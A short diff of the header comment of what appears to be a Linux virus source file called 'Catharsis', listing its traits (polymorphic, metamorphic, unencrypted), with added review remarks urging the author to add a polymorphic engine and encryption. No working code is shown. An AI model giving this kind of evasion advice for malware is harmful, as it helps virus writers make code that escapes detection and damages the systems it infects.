@@ -8,8 +8,8 @@
 ;;    Name of the virus.............: Catharsis
 ;;    Author........................: Timo 'HaZeL' Sarkar / December 2020
 ;;    Size..........................: On 1st generation: aprox. 16800 bytes
-;;    Targets.......................: Linux only... sorry for that
-;;    Encrypted.....................: No
+;;    Targets.......................: Linux only... sorry for that // What in Linux are you targetting? 
+;;    Encrypted.....................: No // If you are using polymorphic techniques you need to have a polymorphic engine so it has a chance to be encrypted. Otherwise the purpose of polymorphic techniques are worthless within this code.
 ;;    Polymorphic...................: Yes
 ;;    Metamorphic...................: Yes
 ;;    Payloads......................: Yes: Stdout
